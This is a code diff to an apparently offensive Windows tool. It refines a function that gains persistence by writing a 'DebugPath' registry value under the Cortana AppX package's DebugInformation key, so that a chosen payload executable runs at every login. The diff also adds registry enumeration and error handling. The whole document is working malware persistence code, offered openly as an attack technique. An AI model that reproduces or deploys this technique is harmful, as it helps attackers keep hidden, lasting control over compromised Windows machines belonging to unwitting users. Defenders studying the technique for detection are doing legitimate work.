@@ -25,23 +25,28 @@ def find_cortana():
 		print_error("Unable to open registry key, exception was raised: {}".format(error))
 		return False
 
-	try:		
-		while True:
-			index += 1
-			if "Microsoft.Windows.Cortana_" in _winreg.EnumKey(key,index):
-				cortana_version.append(_winreg.EnumKey(key,index))				
+	try:
+		num = _winreg.QueryInfoKey(key)[0]
+		for x in range(0, num):
+			if "Microsoft.Windows.Cortana_" in _winreg.EnumKey(key, x):
+				cortana_version.append(_winreg.EnumKey(key, x))
+				break
 	except WindowsError as error:
 		pass
 		
 	return cortana_version
 
-def persistence_cortana_appx(payload, name="DebugPath", add=True):
-	kpath = os.path.join("Software\Classes\ActivatableClasses\Package", find_cortana()[0], "DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca")
-	
+def persistence_cortana_appx(payload, name="", add=True):
+	try:
+		kpath = os.path.join("Software\Classes\ActivatableClasses\Package", find_cortana()[0], "DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca")
+	except IndexError:
+		print_error("Unable to add persistence, Cortana is unavailable on this system")
+		return False
+
 	if add:
-		if payloads().exe(payload):		
-			if registry().modify_key(hkey="hkcu", path=kpath, name=name, value=os.path.join(payload), create=True):
-				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payload))
+		if payloads().exe(payload):
+			if registry().modify_key(hkey="hkcu", path=kpath, name="DebugPath", value=os.path.join(payload), create=True):
+				print_success("Successfully created DebugPath key containing payload ({payload})".format(payload=payload))
 				print_success("Successfully installed persistence, payload will run at login")
 			else:
 				print_error("Unable to add persistence, exception was raised: {}".format(error))
